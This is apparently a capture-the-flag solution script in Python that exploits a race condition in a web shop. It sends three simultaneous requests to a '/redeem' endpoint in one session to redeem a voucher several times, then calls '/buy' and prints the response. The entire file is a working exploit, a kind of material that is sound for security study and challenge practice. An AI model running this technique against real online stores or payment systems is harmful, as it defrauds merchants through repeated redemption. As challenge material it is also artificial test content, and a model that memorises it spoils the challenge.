# docker run -it -e URL=http://localhost:3000/ --network=host $(docker build -q ./solution)

import os
import requests
import threading

URL = os.getenv("URL", f"http://localhost:3000/") 

session = requests.session()

# Create session ID
session.get(URL)

def redeem():
    session.get(f"{URL}redeem")

threads = [threading.Thread(target=redeem) for _ in range(3)]

for thread in threads:
    thread.start()

for thread in threads:
    thread.join()

response = session.get(f"{URL}buy")
print(response.text)

